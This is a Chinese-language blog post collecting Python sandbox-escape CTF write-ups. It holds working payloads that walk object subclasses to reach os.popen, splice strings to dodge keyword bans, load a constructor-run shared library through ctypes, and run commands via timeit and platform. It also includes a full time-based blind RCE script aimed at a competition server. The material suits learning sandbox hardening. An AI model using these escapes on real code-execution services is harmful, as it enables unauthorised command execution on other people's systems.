<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; getattr(__import__(&#39;types&#39;).__builtins__[&#39;__tropmi__&#39;[::-1]](&#39;so&#39;[::-1]), &#39;mets&#39; &#39;ys&#39;[::-1])(&#39;whoami&#39;)</span><br><span class="line">macr0phag3</span><br></pre></td></tr></table></figure>

<h1 id="3"><a href="#3" class="headerlink" title="3"></a>3</h1><h1 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h1><p>总结一下各大赛事中的沙箱逃逸题，感觉还是很好玩的~</p>
<p>先说一下自己对于这种沙箱逃逸题的理解吧，关键在于绕过，一般就是逼你用一些特别的操作去绕过他<code>ban</code>掉的函数，得到<code>flag</code></p>
<p>空说无意，我们直接来看比赛中的一些题目~</p>
<h1 id="2018-ciscn（国赛）题RUN"><a href="#2018-ciscn（国赛）题RUN" class="headerlink" title="2018 ciscn（国赛）题RUN"></a>2018 ciscn（国赛）题RUN</h1><p>它过滤了一些危险函数，比如：<code>os</code>、<code>sys</code>等等，但我们可以通过类的继承关系找到被ban掉的库，然后将它导入进来。比如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[0].__subclasses__()</span><br><span class="line">1</span><br></pre></td></tr></table></figure>

<p>从代码上我们比较好理解，就是从<code>()</code>找到它的父类也就是<code>__bases__[0]</code>，而这个父类就是<code>Python</code>中的根类<code>&lt;type &#39;object&#39;&gt;</code>，它里面有很多的子类，包括<code>file</code>等，这些子类中就有跟<code>os</code>、<code>system</code>等相关的方法，所以，我们可以从这些子类中找到自己需要的方法。</p>
<ul>
<li>python27<br> <img src="https://img-blog.csdn.net/20180521133626809?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d5Xzk3/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></li>
<li>python36<br> <img src="https://img-blog.csdn.net/20180521133600128?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d5Xzk3/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></li>
</ul>
<p>知道了上面的基础后，我们可以找到一些<code>payload</code>，比如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;读文件</span><br><span class="line">().__class__.__bases__[0].__subclasses__()[40](r&#39;C:\1.php&#39;).read()</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;写文件</span><br><span class="line">().__class__.__bases__[0].__subclasses__()[40](&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;input&#39;, &#39;w&#39;).write(&#39;123&#39;)</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;执行任意命令</span><br><span class="line">().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;ls  &#x2F;var&#x2F;www&#x2F;html&quot;).read()&#39; )</span><br><span class="line">12345678</span><br></pre></td></tr></table></figure>

<p>但这道题的突破点是在获得类的属性上，从网上找的<code>payload</code>中存在一些被<code>ban</code>掉的关键字，如<code>func_globals</code>中存在<code>ls</code>，这也是做题时卡着的地方。而这些都可以用<code>__getattribute__</code>进行突破</p>
<p>关于这里给出的最后一个可能的<code>payload</code>，我们来看一下其可获取的是什么？</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]</span><br><span class="line">1</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdn.net/20180521133817108?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d5Xzk3/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p>
<p>很明显可见<code>eval</code>，<code>map</code>等一些函数，根据这个<code>payload</code>，可知其对这些函数的使用方法为[‘function name’]，简单本地做了一个测试，这是完全没有问题的。</p>
<p><img src="https://img-blog.csdn.net/20180521134446760?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d5Xzk3/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p>
<p>本题最终给出<code>payload</code>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__(&#39;func_global&#39;+&#39;s&#39;)[&#39;linecache&#39;].__dict__[&#39;o&#39;+&#39;s&#39;].__dict__[&#39;popen&#39;](&#39;l&#39;+&#39;s&#39;).read()</span><br><span class="line">1</span><br></pre></td></tr></table></figure>

<p>这个<code>payload</code>提到了一个新的点<code>linecache</code>， 搜索一下很容易得到这是一个模块用于读取文件的，但os出现在这里是个什么情况？</p>
<p>python本地查看一下属性，，，好吧，真的有~</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__(&#39;func_global&#39;+&#39;s&#39;)[&#39;linecache&#39;].__dict__</span><br><span class="line">1</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdn.net/20180521140345346?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d5Xzk3/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p>
<p>以上这部分<code>writeup</code>参考的<code>@junay</code> 的<a href="https://delcoding.github.io/2018/05/ciscn-writeup/" target="_blank" rel="noopener">博客</a></p>
<p>在Github上，我又看到了<code>@Xopowo</code>队伍大师傅放出来的<a href="https://github.com/t3ls/CISCN2018-Xopowo-writeup" target="_blank" rel="noopener">write up</a>，师傅们提出了一种新思路，使用到<code>so</code>库</p>
<p>在<code>().__class__.__bases__[0].__subclasses__()</code>中发现有可用的类</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;type &#39;file&#39;&gt;</span><br><span class="line">&lt;class &#39;ctypes.CDLL&#39;&gt;</span><br><span class="line">&lt;class &#39;ctypes.LibraryLoader&#39;&gt;</span><br><span class="line">123</span><br></pre></td></tr></table></figure>

<p>构造一个<code>so</code>库，列一下<code>/home/ctf/</code>下的文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;  </span><br><span class="line">void my_init(void) __attribute__((constructor)); </span><br><span class="line">void my_init(void)  </span><br><span class="line">&#123;  </span><br><span class="line">    system(&quot;ls -la &#x2F;home&#x2F;ctf&#x2F; &gt; &#x2F;tmp&#x2F;ls_home_ctf&quot;);</span><br><span class="line">&#125;  </span><br><span class="line">123456</span><br></pre></td></tr></table></figure>

<p>将编译好的<code>so</code>直接二进制写入<code>/tmp/bk.so</code></p>
<p>使用<code>ctypes</code>加载<code>so</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[0].__subclasses__()[86](().__class__.__bases__[0].__subclasses__()[85]).LoadLibrary(&#39;&#x2F;tmp&#x2F;bk.so&#39;)</span><br><span class="line">1</span><br></pre></td></tr></table></figure>

<h1 id="SWPU-CTF-2017-题python-sandbox"><a href="#SWPU-CTF-2017-题python-sandbox" class="headerlink" title="SWPU CTF 2017 题python sandbox"></a>SWPU CTF 2017 题python sandbox</h1><p>这题用到了<code>timeit</code>的一个骚操作，直接贴官方的<strong>write up</strong></p>
<p>出题思路：这其实是一个我想做的<code>python</code>在线代码编辑练习的站点，因为要考虑其安全性，所以我把文件读写，网络请求和一些危险模块<code>ban</code>掉了，这样就形成了一个沙盒,也就出现了这道题目。</p>
<p>从师傅们的<code>payload</code>可以看到大多是这几种:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">    __builtin__</span><br><span class="line"></span><br><span class="line">    [].__class__.__base__.__subclasses__()魔术方法；</span><br><span class="line"></span><br><span class="line">    一些危险模块等</span><br><span class="line">12345</span><br></pre></td></tr></table></figure>

<p>还有些师傅直接以为是<code>pwn</code>过沙盒，-。-！！但是其实没有那么复杂啊，这是一道web题，我后面给出的tips是:内置模块,内置函数，而python的内置模块百度下或者去官方还是很容易获得一个列表的，除去我<code>ban</code>掉的如<code>os</code>,<code>sys</code>等危险的模块，还有很多可以尝试的啊 .</p>
<p>我这里给出的利用是来自一个常见的内置模块:<code>timeit</code>.我相信很多初学<code>python</code>的人都会用到<code>timeit</code>模块来获取代码的执行时间，参看其文档可以看到这样的用法可以导致任意代码执行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf-8 </span><br><span class="line">import timeit </span><br><span class="line">timeit.timeit(&quot;__import__(&#39;os&#39;).system(&#39;&#39;)&quot;, number&#x3D;1)</span><br><span class="line">123</span><br></pre></td></tr></table></figure>

<p>还有一个模块<code>platform</code>,同样也可以的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import platform </span><br><span class="line"></span><br><span class="line">platform.popen(&#39;id&#39;, mode&#x3D;&#39;r&#39;, bufsize&#x3D;-1).read()</span><br><span class="line">1234</span><br></pre></td></tr></table></figure>

<p>在<code>timeit</code>模块里利用<code>import</code>内置函数加载<code>os</code>模块，然后就可以任意命令执行了，但是<code>cat flag</code>是没有回显的，因为<strong>返回的是代码的执行时间</strong>.再加上这里我<strong>把发起网络请求也给ban了</strong>，所以并不能通过<code>cloudeye</code>等外带通道获取命令执行的结果。</p>
<p>于是这里就有了我以前碰到的一种特殊情况:一个没有回显不能访问外网的命令执行，怎么获取返回的结果呢？答案是:<strong>time based rce</strong></p>
<p>最后写个类似盲注的脚本跑跑就出来了：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line">#author:icematcha</span><br><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line">import base64</span><br><span class="line">payloads &#x3D; &quot;QWERTYUIIOPASDFGHJKLZXCVBNM1234567890&#x3D;&quot;</span><br><span class="line">def request(url, data, timeout):</span><br><span class="line">    try:</span><br><span class="line">        res &#x3D; requests.post(url, data &#x3D; data, timeout &#x3D; timeout)</span><br><span class="line">        return res.content</span><br><span class="line">    except:</span><br><span class="line">        return True</span><br><span class="line">def get_length(url, cmd, timeout):</span><br><span class="line">    length &#x3D; &#39;&#39; </span><br><span class="line">    for i in xrange(1,10):</span><br><span class="line">        value &#x3D; &#39;&#39;&#39;#!&#x2F;usr&#x2F;bin&#x2F;python</span><br><span class="line">#coding:utf-8</span><br><span class="line">import timeit</span><br><span class="line">timeit.timeit(&quot;__import__(&#39;os&#39;).system(&#39;if [ $(%s|base32|wc -c|cut -c %s) &#x3D;  ];then sleep 2;fi&#39;)&quot;, number&#x3D;1)</span><br><span class="line">&#39;&#39;&#39; % (cmd, i)</span><br><span class="line">        data &#x3D; &#123;&#39;process&#39;: value&#125;</span><br><span class="line">        res &#x3D; request(url, data, timeout)  </span><br><span class="line">        if res:</span><br><span class="line">            llength &#x3D; i</span><br><span class="line">            break</span><br><span class="line">    for i in xrange(1, llength):</span><br><span class="line">        for _ in xrange(1, 10):</span><br><span class="line">            value &#x3D; &#39;&#39;&#39;#!&#x2F;usr&#x2F;bin&#x2F;python</span><br><span class="line">#coding:utf-8</span><br><span class="line">import timeit</span><br><span class="line">timeit.timeit(&quot;__import__(&#39;os&#39;).system(&#39;if [ $(%s|base32|wc -c|cut -c %s) &#x3D; %s ];then sleep 2;fi&#39;)&quot;, number&#x3D;1)</span><br><span class="line">&#39;&#39;&#39; % (cmd, i, _)</span><br><span class="line">            data &#x3D; &#123;&#39;process&#39;: value&#125;</span><br><span class="line">            if request(url, data, timeout):</span><br><span class="line">                length +&#x3D; str(_)</span><br><span class="line">                print length</span><br><span class="line">                break</span><br><span class="line">    return length</span><br><span class="line">def get_content(url, cmd, timeout, length):</span><br><span class="line">    content &#x3D; &#39;&#39;</span><br><span class="line">    for i in xrange(1, int(length)+1):</span><br><span class="line">        for payload in payloads:</span><br><span class="line">            value &#x3D; &#39;&#39;&#39;#!&#x2F;usr&#x2F;bin&#x2F;python</span><br><span class="line">#coding:utf-8</span><br><span class="line">import timeit</span><br><span class="line">timeit.timeit(&quot;__import__(&#39;os&#39;).system(&#39;if [ $(%s|base32|cut -c %s) &#x3D; %s ];then sleep 2;fi&#39;)&quot;, number&#x3D;1)</span><br><span class="line">&#39;&#39;&#39; % (cmd, i, payload)</span><br><span class="line">            data &#x3D; &#123;&#39;process&#39;: value&#125;</span><br><span class="line">            if request(url, data, timeout):</span><br><span class="line">                content +&#x3D; payload</span><br><span class="line">                print content</span><br><span class="line">                break</span><br><span class="line">    return content</span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    length &#x3D; get_length(&#39;http:&#x2F;&#x2F;47.95.252.234&#x2F;runcode&#39;,&#39;cat flag&#39;, 2.0)</span><br><span class="line">    print &quot;## The base32 of content&#39;s length is:%s&quot; % length</span><br><span class="line">    content &#x3D; get_content(&#39;http:&#x2F;&#x2F;47.95.252.234&#x2F;runcode&#39;, &#39;cat flag&#39;, 2.0, length)</span><br><span class="line">    print &quot;## The base32 of content is:%s&quot; % content</span><br><span class="line">    print &quot;## The commend result content is:%s&quot; % base64.b32decode(content).strip()</span><br><span class="line"></span><br><span class="line">123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960</span><br></pre></td></tr></table></figure>

<p>以上write up来自<a href="https://www.secpulse.com/archives/65568.html" target="_blank" rel="noopener">比赛官方</a>，而关于核心问题<strong>time based rce</strong>，其实就是可以理解为sql注入中我们常用的<strong>sleep盲注</strong>，这里都不用我们计算时间，时间由其返回</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>1、注意题目为<code>python2</code>还是<code>python3</code>的环境，其对应的库会有很大的一个差距，但总体来说，<code>python27</code>有的，<code>python3</code>都有，但需要改变相应下标</p>
<p>2、曲径通幽，多绕绕，最终获得你想要的模块，<strong>认真找</strong>，<strong>慢慢翻</strong>，会有很多的收获，比如从<code>().__class__.__bases__[0].__subclasses__()</code> 出发，查看可用的类</p>
<ul>
<li>若类中有<code>file</code>，考虑读写操作</li>
<li>若类中有<code>&lt;class &#39;warnings.WarningMessage&#39;&gt;</code>，考虑从<code>.__init__.func_globals.values()[13]</code>获取<code>eval</code>，<code>map</code>等等；又或者从<code>.__init__.func_globals[linecache]</code> 得到os</li>
<li>若类中有<code>&lt;type &#39;file&#39;&gt;</code>，<code>&lt;class &#39;ctypes.CDLL&#39;&gt;</code>，<code>&lt;class &#39;ctypes.LibraryLoader&#39;&gt;</code>，考虑构造so文件</li>
</ul>
<p>其他的相关关键字可以搜索<strong>魔法函数</strong>，你会对这些看起来稀奇古怪的函数有更多的理解</p>
<p>3、分析<code>ban</code>函数的时候考虑使用字符串拼接结合<code>__getattribute__</code>绕过；当然也可以考虑<code>base64</code>加解密来进行绕过，这部分可以参考sql注入的绕过思想</p>
<p>4、两个不常见的执行任意命令的方法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import timeit</span><br><span class="line">timeit.timeit(&quot;__import__(&#39;os&#39;).system(&#39;dir&#39;)&quot;,number&#x3D;1)</span><br><span class="line">12</span><br><span class="line">import platform</span><br><span class="line">print platform.popen(&#39;dir&#39;).read()</span><br><span class="line">12</span><br></pre></td></tr></table></figure>

<p><code>timeit</code>考虑<strong>time based rce</strong></p>
<p>5、注意一种简单题型，出题者只做了如下一些处理：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; del __builtins__.__dict__[&#39;__import__&#39;] # __import__ is the function called by the import statement</span><br><span class="line">&gt;&gt;&gt; del __builtins__.__dict__[&#39;eval&#39;] # evaluating code could be dangerous</span><br><span class="line">&gt;&gt;&gt; del __builtins__.__dict__[&#39;execfile&#39;] # likewise for executing the contents of a file</span><br><span class="line">&gt;&gt;&gt; del __builtins__.__dict__[&#39;input&#39;] # Getting user input and evaluating it might be dangerous</span><br><span class="line">1234</span><br></pre></td></tr></table></figure>

<p>看起来好像已经非常安全是么？但是，<code>reload(module)</code> 重新加载导入的模块，并执行代码。所以模块被导回到我们的命名空间。</p>
<p>6、导入模块的方式。</p>
<ul>
<li>最直接的import.</li>
<li>内置函数 import</li>
<li>importlib库</li>
</ul>
<p>以<code>commands</code>模块为列:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import importlib</span><br><span class="line">f3ck &#x3D; importlib.import_module(&quot;pbzznaqf&quot;.decode(&#39;rot_13&#39;)</span><br><span class="line">print f3ck.getoutput(&#39;ifconfig&#39;)</span><br><span class="line">123</span><br></pre></td></tr></table></figure>

<p>7、阅读了大量相关文章，看到有大牛通过pwn去做python沙箱逃逸题，pwn师傅们可以自行搜索~</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/09/19/python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/" data-id="clmvoc2b80011jg7k016r7zwa" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2021/01/11/cisp/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          cisp
        
      </div>
    </a>
  
  
    <a href="/2020/08/07/python/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">python</div>
    </a>
  
</nav>

  
</article>

</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">分类</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Misc/">Misc</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/ctf/">ctf</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/">web</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/">密码学</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9D%82/">杂</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">标签</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Coppersmith/" rel="tag">Coppersmith</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/GraphiQL/" rel="tag">GraphiQL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/" rel="tag">php伪协议</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/rsa/" rel="tag">rsa</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sage/" rel="tag">sage</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/unctf/" rel="tag">unctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xxe/" rel="tag">xxe</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%A4%A7%E7%BB%9F%E4%B8%80%E5%9C%BA%E7%90%86%E8%AE%BA/" rel="tag">大统一场理论</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/" rel="tag">密码学</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="tag">文件上传</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="tag">文件包含</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" rel="tag">文件读取</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">标签云</h3>
    <div class="widget tagcloud">
      <a href="/tags/Coppersmith/" style="font-size: 10px;">Coppersmith</a> <a href="/tags/GraphiQL/" style="font-size: 10px;">GraphiQL</a> <a href="/tags/PHP/" style="font-size: 10px;">PHP</a> <a href="/tags/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/" style="font-size: 10px;">php伪协议</a> <a href="/tags/rsa/" style="font-size: 10px;">rsa</a> <a href="/tags/sage/" style="font-size: 10px;">sage</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">sql注入</a> <a href="/tags/unctf/" style="font-size: 10px;">unctf</a> <a href="/tags/wp/" style="font-size: 10px;">wp</a> <a href="/tags/xxe/" style="font-size: 10px;">xxe</a> <a href="/tags/%E5%A4%A7%E7%BB%9F%E4%B8%80%E5%9C%BA%E7%90%86%E8%AE%BA/" style="font-size: 10px;">大统一场理论</a> <a href="/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/" style="font-size: 20px;">密码学</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 10px;">文件上传</a> <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" style="font-size: 10px;">文件包含</a> <a href="/tags/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" style="font-size: 10px;">文件读取</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">归档</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/07/">七月 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/04/">四月 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/10/">十月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">五月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">四月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">三月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">一月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">九月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">八月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">七月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">十二月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">十一月 2019</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">最新文章</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2023/07/24/%E5%89%8D%E7%AB%AF/">前端</a>
          </li>
        
          <li>
            <a href="/2023/04/20/%E6%89%94%E5%87%BA%E5%8E%BB%E7%9A%84%E9%83%A8%E5%88%86/">扔出去的部分</a>
          </li>
        
          <li>
            <a href="/2023/04/20/%E4%B8%96%E7%95%8C%E8%A7%82/">世界观</a>
          </li>
        
          <li>
            <a href="/2022/10/01/%E6%9D%82/">杂</a>
          </li>
        
          <li>
            <a href="/2021/05/15/%E7%BD%91%E6%96%87/">网文</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2023 zhiliya<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">

  
<script src="/fancybox/jquery.fancybox.pack.js"></script>




<script src="/js/script.js"></script>




  </div>
</body>
</html>